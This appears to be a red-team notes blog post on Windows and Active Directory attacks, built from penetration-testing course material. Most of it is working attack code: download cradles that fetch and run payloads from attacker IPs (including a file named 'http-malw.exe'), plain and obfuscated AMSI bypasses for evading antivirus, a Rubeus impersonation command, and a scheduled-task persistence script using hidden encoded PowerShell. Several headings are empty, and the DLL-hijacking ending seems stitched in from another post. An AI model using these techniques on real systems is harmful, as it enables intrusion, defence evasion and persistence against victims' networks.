---
title: "Notes" 
layout: "post"
---

This blog post has been updated based on some tools and techniques from Offensive Security’s PEN-300 course as well ad the CRTO course from Rastamouse. Notable changes have been made in the sections on delegation, inter-forest exploitation, and lateral movement through MSSQL servers. It should be useful in a lot of cases when dealing with Windows / AD exploitation.

## Enumeration

# 0) PowerShell one-liners

.NET reflection allows an application to obtain information about loaded assemblies and the types defined within them, then even create and invoke new instances.

### Load PowerShell script reflectively
Proxy-aware:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
```
Non-proxy aware:
```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
```
__Note:__ Again, this will likely get flagged 🚩. For opsec-safe download cradles, check out [CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)



### Load C# assembly reflectively

Ensure that the referenced class and main methods are Public before running this. Note that a process-wide AMSI bypass may be required for this, [check this out](https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/)

```powershell
# Download and run assembly without arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main("".Split())

# Download and run Rubeus, with arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# Execute a specific method from an assembly (e.g. a DLL)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

### Load DLL assembly reflectively 

The most basic (although not very interesting) method of loading and running this code, is from disk using PowerShell:

```powershell
PS > [System.Reflection.Assembly]::LoadFile("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```


We could also encode the DLL to a base64 string and load it without it needing to be on disk:

```powershell
PS > $dll = [System.IO.File]::ReadAllBytes("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
PS > $dllstring = [System.Convert]::ToBase64String($dll)
PS > [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($dllstring))
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```

Or download the DLL from a remote location:

```powershell
PS > $dll = (new-object net.webclient).DownloadData("http://10.8.0.6/ReflectionDemo.dll")
PS > [System.Reflection.Assembly]::Load($dll)
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```

You can use this reflection technique to download and run a GruntStager EXE directly from memory, without having it touch disk.  For example:

```powershell
PS > $malware = (new-object net.webclient).downloaddata("http://10.8.0.6/http-malw.exe")
PS > [System.Reflection.Assembly]::Load($malware)
```

__Note:__ .NET 4.8, Assembly.Load is AMSI-aware 🚩



### 1) Powershell AMSI Bypass

Patching AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged. Obfuscate, or even better, eliminate the need for an __AMSI bypass__ altogether by altering your scripts to beat signature-based detection.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Obfuscation example for copy-paste purposes:

```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Another method could be to compile the C# bypass to a .NET DLL and use PowerShell to load it reflectively.

```powershell
PS C:\> $bytes = [System.IO.File]::ReadAllBytes("c:\tools\AmsiTest\bin\Debug\AmsiTest.dll")
PS C:\> [System.Reflection.Assembly]::Load($bytes)
GAC Version Location
--- ------- -------
False v4.0.30319
PS C:\> [Amsi]::Bypass()
PS C:\> Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, script file, or operable program.
```



### 2) Powershell Oneliner

### 3) Applocker 

### 4) Powershell CLM & LAPS

#### PowerShell Constrained Language Mode
Sometimes you may find yourself in a PowerShell session that enforces Constrained Language Mode (CLM). This is very often the case when paired with AppLocker.
You can identify you’re in constrained language mode by polling the following variable to get the current language mode. It will say FullLanguage for an unrestricted session, and ConstrainedLanguage for CLM. 

```powershell
$ExecutionContext.SessionState.LanguageMode
```

The constraints posed by CLM will block many of your exploitations attempts. One quick and dirty bypass is to use in-line functions, which sometimes works - if e.g. whoami is blocked, try the following:

```powershell
&{whoami}
```

#### LAPS 
We can use LAPSToolkit.ps1 to identify which machines in the domain use LAPS, and which domain groups are allowed to read LAPS passwords. If we are in this group, we can get the current LAPS passwords using this tool as well.

```powershell
#Get computers running LAPS, along with their passwords if we're allowed to read those
Get-LAPSComputers
#Get groups allowed to read LAPS passwords
Find-LAPSDelegatedGroups
```


### 5)

### 6)

### 7) 


# PrivEsc

# Persistence

### Classic Startup folder

Just drop a binary in current user folder, will trigger when current user signs in:

```cpp
"C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```
Or in the startup folder, requires administrative privileges but will trigger as SYSTEM on boot and when any user signs on:

```cpp
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

### Schedule Tasks

This PowerShell script will execute a new Grunt (using our existing PowerShell payload) every 4 hours for up to 30 days. If you omit the RepetitionDuration option in the trigger, it will repeat indefinitely.

```powershell
function New-ScheduledTaskPersistence {

    $name = "Persistence"
  
    $trigger = New-ScheduledTaskTrigger `
        -Once `
        -At 11am `
        -RepetitionInterval (New-TimeSpan -Hours 4) `
        -RepetitionDuration (New-TimeSpan -Days 30)
  
      $action = New-ScheduledTaskAction `
        -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -Argument "-Sta -Nop -Window Hidden -EncodedCommand " `
        -WorkingDirectory "C:\Windows\System32"
  
      Register-ScheduledTask `
        -TaskName $name `
        -Trigger $trigger `
        -Action $action `
        -Force
}
```
To execute this PowerShell script on the target, go to the Interact CLI, import and execute the powershell module 





# Lateral Movement

# Domain Dominance


The locations in the "pre-search" are highlighted in green because they are safe (from a privilege escalation perspective). If the name of the DLL doesn't correspond to a DLL which is already loaded in memory or if it's not a __known DLL__, the actual search begins. The program will first try to load it from the application's directory. If it succeeds, the search stops there otherwise it continues with the `C:\Windows\System32` folder and so on...


```cpp
HMODULE hModule = LoadLibrary(argv[1]);
if (hModule) {
    wprintf(L"LoadLibrary() OK\n");
    FreeLibrary(hModule);
} else {
    wprintf(L"LoadLibrary() KO - Error: %d\n", GetLastError());
}
```

__Scenario 1:__ loading a DLL which exists in the application's directory.

<p align="center">
 <img src="/assets/posts/2020-04-24-windows-dll-hijacking-clarified/02_loadlibrary-appdir.png">
</p>


The program finds the DLL in its directory `C:\MyCustomApp`, that's the first location in the search order so the library is loaded successfully. Everything is fine. :ok_hand:


